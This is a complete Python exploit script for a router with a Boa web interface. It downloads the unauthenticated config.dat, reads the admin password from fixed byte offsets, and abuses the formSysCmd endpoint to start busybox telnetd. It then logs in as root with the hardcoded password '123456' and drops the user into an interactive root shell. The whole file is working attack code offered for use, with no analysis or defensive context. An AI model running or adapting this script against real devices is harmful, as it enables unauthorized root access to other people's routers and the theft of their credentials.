#!/usr/bin/env python3
import sys
import os
import requests
import telnetlib
import base64
from urllib import request 

def get_config(target, localfile="./config.dat.tmp-" + str(os.getpid())):
    global tmpconfig
    tmpconfig = localfile
    url = 'http://' + target + '/config.dat'
    data = requests.get(url)
    open(localfile, 'wb').write(data.content)

def get_password():
    index = 0
    string = ""

    for b in get_bytes_from_file(tmpconfig):
        index += 1

        if 189 <= index <= 206:
            string += (get_only_ascii(chr(b)))

    return string

def get_bytes_from_file(filename, chunksize=8192):
    with open(filename, "rb") as file:
        while True:
            chunk = file.read(chunksize)
            if chunk:
                for b in chunk:
                    yield b
            else:
                break

def get_only_ascii(char):
    if 48 <= ord(char) <= 126:
        return char
    else:
        return ''

def run_telnetd(target):

    credentials = ('%s:%s' % ('admin', get_password()))
    encoded_credentials = base64.b64encode(credentials.encode('ascii'))

    req = request.Request('http://' + target + '/boafrm/formSysCmd', method="POST")
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req.add_header('Authorization', 'Basic %s' % encoded_credentials.decode("ascii"))
    data = 'submit-url=%2Fsyscmd.htm&sysCmdselect=5&sysCmdselects=0&save_apply=Run+Command&sysCmd=busybox%20telnetd'
    data = data.encode()
    r = request.urlopen(req, data=data)
    #content = r.read()


def telnet_connect(target):
    telnet = telnetlib.Telnet(target)
    telnet.read_until(b"login: ")
    telnet.write("root".encode('ascii') + b"\n")

    telnet.read_until(b"Password: ")
    telnet.write("123456".encode('ascii') + b"\n")

    telnet.interact()

def cleanup():
    os.remove(tmpconfig)

if (len(sys.argv)) != 2:
	print ("Usage: " + sys.argv[0] + " <target IP>")
	exit(1)

print ("Setting target to " + sys.argv[1])
target = sys.argv[1]

print ("Downloading config")
get_config(target)
print ("Router admin password is: " + get_password())
print ("Running busybox/telnetd")
run_telnetd(target)
print ("Dropping you into a root shell -- have a nice day")
telnet_connect(target)
print ("Cleaning up")
cleanup()
